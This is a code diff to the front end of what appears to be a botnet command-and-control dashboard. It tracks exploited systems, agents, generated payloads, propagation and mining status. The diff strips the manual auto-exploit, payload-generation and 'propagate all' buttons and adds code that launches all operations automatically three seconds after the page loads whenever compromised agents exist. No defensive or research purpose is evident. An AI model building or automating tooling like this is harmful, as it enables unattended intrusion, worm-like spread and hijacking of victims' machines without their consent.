@@ -293,31 +293,18 @@
         <div class="div-system-name"><span>✅ Exploited</span></div>
         <div style="font-family:var(--font-mono); color:#00ff00; font-size:13px;" id="exploited-count">0</div>
       </div>
-      
-      <div style="margin-top:10px;">
-        <button style="background:#ff4444; border:none; padding:8px 15px; border-radius:5px; color:white; cursor:pointer; font-size:11px;" onclick="startExploitation()">
-          🚀 START AUTO-EXPLOIT
-        </button>
-      </div>
     </div>
     
     <!-- PAYLOADS PANEL -->
     <div style="background:linear-gradient(135deg, #0a1a1a 0%, #102a2a 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #00aaaa;">
       <div style="font-size:11px; color:#00aaaa; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">📦 PAYLOADS</div>
-      
-      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
-        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="generatePayload('python')">
-          🐍 Python
-        </button>
-        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="generatePayload('powershell')">
-          💠 PowerShell
-        </button>
-        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="generatePayload('bash')">
-          🐚 Bash
-        </button>
-        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="showPayloads()">
-          📋 List All
-        </button>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>Generated</span></div>
+        <div style="font-family:var(--font-mono); color:#00aaaa; font-size:13px;" id="payloads-generated">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>Available</span></div>
+        <div style="font-family:var(--font-mono); color:#00aaaa; font-size:13px;" id="payloads-available">0</div>
       </div>
     </div>
     
@@ -336,12 +323,6 @@
       <div class="dom-system-row">
         <div class="dom-system-name"><span>🆕 New Agents (24h)</span></div>
         <div style="font-family:var(--font-mono); color:#00ff00; font-size:13px;" id="prop-new-agents">0</div>
-      </div>
-      
-      <div style="margin-top:10px;">
-        <button style="background:#aaaa00; border:none; padding:8px 15px; border-radius:5px; color:black; cursor:pointer; font-size:11px; font-weight:bold;" onclick="startPropagation()">
-          🦠 PROPAGATE ALL
-        </button>
       </div>
     </div>
     
@@ -453,6 +434,15 @@ document.addEventListener('DOMContentLoaded', () => {
   loadAll();
   setInterval(loadAll, 30000);
   setInterval(updateMiningStatus, 10000);
+  
+  // Auto-start after 3 seconds if agents exist
+  setTimeout(async () => {
+    const total = parseInt(document.getElementById('stat-total')?.textContent || '0');
+    if (total > 0) {
+      log('info', 'Auto-starting operations...', 'sys');
+      await startAll();
+    }
+  }, 3000);
 });
 
 // Socket.IO - use existing global socket or create new
